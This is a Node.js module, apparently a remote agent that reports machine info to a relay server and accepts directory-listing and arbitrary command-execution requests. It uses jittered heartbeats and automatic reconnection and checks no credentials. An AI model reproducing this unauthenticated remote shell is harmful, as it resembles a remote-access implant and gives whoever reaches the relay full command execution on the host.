const net = require('net');
const { execSync, exec } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');
const cfg = require('./config');
const { startFileServer } = require('./server');

let relayConn = null;
let heartbeatTimer = null;
let fileServer = null;
let cmdServer = null;
let tailscaleIP = '';
let drives = [];

function detectTailscaleIP() {
  try {
    const out = execSync(`"${cfg.TAILSCALE_PATH}" ip -4`, { timeout: 5000, stdio: ['pipe', 'pipe', 'pipe'] }).toString().trim();
    if (out) tailscaleIP = out;
    return tailscaleIP;
  } catch(e) {
    return '';
  }
}

function detectDrives() {
  const d = [];
  try {
    const out = execSync('wmic logicaldisk get caption,size,freespace', { timeout: 3000, stdio: ['pipe', 'pipe', 'pipe'] }).toString();
    const lines = out.split('\n').slice(1);
    for (const line of lines) {
      const parts = line.trim().split(/\s+/);
      if (parts[0]) {
        const cap = parseInt(parts[1]) || 0;
        const free = parseInt(parts[2]) || 0;
        d.push({ drive: parts[0], total: Math.floor(cap / 1e9), free: Math.floor(free / 1e9) });
      }
    }
  } catch(e) {}
  drives = d;
  return d;
}

function machineInfo() {
  return {
    id: cfg.instanceId,
    hostname: cfg.hostname,
    ip: tailscaleIP,
    drives,
    os: `${os.type()} ${os.release()}`,
    uptime: Math.floor(os.uptime() / 3600),
    arch: os.arch(),
  };
}

function sendHeartbeat() {
  const info = machineInfo();
  const msg = JSON.stringify({ type: 'heartbeat', ...info }) + '\n';
  if (relayConn && relayConn.writable) {
    relayConn.write(msg);
  }
}

function connectToRelay() {
  if (relayConn) try { relayConn.end(); } catch(e) {}
  relayConn = new net.Socket();
  relayConn.connect(cfg.RELAY_PORT, cfg.RELAY_IP, () => {
    sendHeartbeat();
    if (heartbeatTimer) clearInterval(heartbeatTimer);
    heartbeatTimer = setInterval(sendHeartbeat, cfg.HEARTBEAT_INTERVAL + Math.floor(Math.random() * 10000));
  });
  relayConn.on('data', (d) => {
    const lines = d.toString().split('\n').filter(Boolean);
    for (const line of lines) {
      try {
        const msg = JSON.parse(line);
        handleRelayCommand(msg);
      } catch(e) {}
    }
  });
  relayConn.on('close', () => {
    relayConn = null;
    setTimeout(connectToRelay, 5000);
  });
  relayConn.on('error', () => { relayConn = null; });
}

function handleRelayCommand(msg) {
  if (!msg || msg.target !== cfg.instanceId) return;
  const { cmd, args, replyId } = msg;
  let result = '';

  try {
    switch (cmd) {
      case 'ls': {
        const dir = args || 'C:\\';
        const items = fs.readdirSync(dir).map(name => {
          const full = path.join(dir, name);
          let s = { name };
          try { s.dir = fs.statSync(full).isDirectory(); s.size = fs.statSync(full).size; } catch(e) {}
          return s;
        });
        result = JSON.stringify(items, null, 2);
        break;
      }
      case 'tree': {
        const dir = args || 'C:\\';
        result = buildTree(dir, 0);
        break;
      }
      case 'exec': {
        const out = execSync(args, { timeout: 10000, stdio: ['pipe', 'pipe', 'pipe'] }).toString();
        result = out;
        break;
      }
      case 'screenshot': {
        result = 'screenshot via PowerShell not implemented on this agent';
        break;
      }
      default:
        result = `Unknown command: ${cmd}`;
    }
  } catch(e) {
    result = `Error: ${e.message}`;
  }

  const resp = JSON.stringify({ type: 'cmdResult', replyId, target: cfg.instanceId, data: result }) + '\n';
  if (relayConn && relayConn.writable) relayConn.write(resp);
}

function buildTree(dir, depth) {
  if (depth > 4) return '  '.repeat(depth) + '... (max depth)\n';
  let out = '';
  try {
    const items = fs.readdirSync(dir);
    for (const name of items) {
      const full = path.join(dir, name);
      let isDir = false;
      try { isDir = fs.statSync(full).isDirectory(); } catch(e) { continue; }
      out += '  '.repeat(depth) + (isDir ? '[DIR] ' : '[FIL] ') + name + '\n';
      if (isDir) out += buildTree(full, depth + 1);
    }
  } catch(e) {}
  return out;
}

function startCmdServer() {
  cmdServer = net.createServer((socket) => {
    socket.on('data', (d) => {
      try {
        const msg = JSON.parse(d.toString());
        handleRelayCommand(msg);
      } catch(e) {}
    });
  });
  cmdServer.listen(cfg.CMD_PORT, tailscaleIP || '127.0.0.1', () => {});
}

function init() {
  detectTailscaleIP();
  detectDrives();
  startFileServer(tailscaleIP || '127.0.0.1', cfg.FS_PORT);
  startCmdServer();
  setTimeout(connectToRelay, 2000);
}

module.exports = { init, machineInfo, detectTailscaleIP, detectDrives };
